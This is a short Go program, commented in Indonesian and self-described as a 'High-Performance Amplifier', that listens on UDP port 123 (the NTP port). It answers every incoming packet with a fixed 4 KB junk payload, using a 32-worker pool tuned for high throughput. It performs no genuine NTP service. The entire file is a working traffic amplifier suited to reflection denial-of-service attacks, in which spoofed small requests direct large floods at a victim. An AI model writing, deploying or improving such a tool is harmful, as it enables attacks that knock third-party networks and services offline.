package main
//amplifer
import (
	"fmt"
	"net"
	"runtime"
	"sync"
)

const (
	PORT          = ":123"
	RESPONSE_SIZE = 1024 * 4 // 4 KB payload
	NUM_WORKERS   = 32       // Sesuaikan dengan core count EPYC 9754
)

func main() {
	// Set GOMAXPROCS untuk memanfaatkan semua core EPYC
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	addr, err := net.ResolveUDPAddr("udp", PORT)
	if err != nil {
		panic(err)
	}
	
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	fmt.Printf("🚀 High-Performance Amplifier aktif di UDP port 123\n")
	fmt.Printf("⚡ Menggunakan %d CPU cores\n", runtime.NumCPU())
	fmt.Printf("📦 Response size: %d bytes\n", RESPONSE_SIZE)

	// Pre-allocate response buffer sekali saja
	response := make([]byte, RESPONSE_SIZE)
	for i := range response {
		response[i] = 0x1c
	}

	// Channel untuk mendistribusikan pekerjaan
	jobs := make(chan *net.UDPAddr, 1000)
	
	// Worker pool untuk menangani responses
	var wg sync.WaitGroup
	for i := 0; i < NUM_WORKERS; i++ {
		wg.Add(1)
		go worker(conn, response, jobs, &wg)
	}

	// Main loop untuk menerima packets
	buffer := make([]byte, 512)
	for {
		_, remoteAddr, err := conn.ReadFromUDP(buffer)
		if err != nil {
			continue
		}
		
		// Non-blocking send ke worker
		select {
		case jobs <- remoteAddr:
		default:
			// Jika channel penuh, skip (untuk menghindari blocking)
		}
	}
}

func worker(conn *net.UDPConn, response []byte, jobs <-chan *net.UDPAddr, wg *sync.WaitGroup) {
	defer wg.Done()
	
	for remoteAddr := range jobs {
		conn.WriteToUDP(response, remoteAddr)
	}
}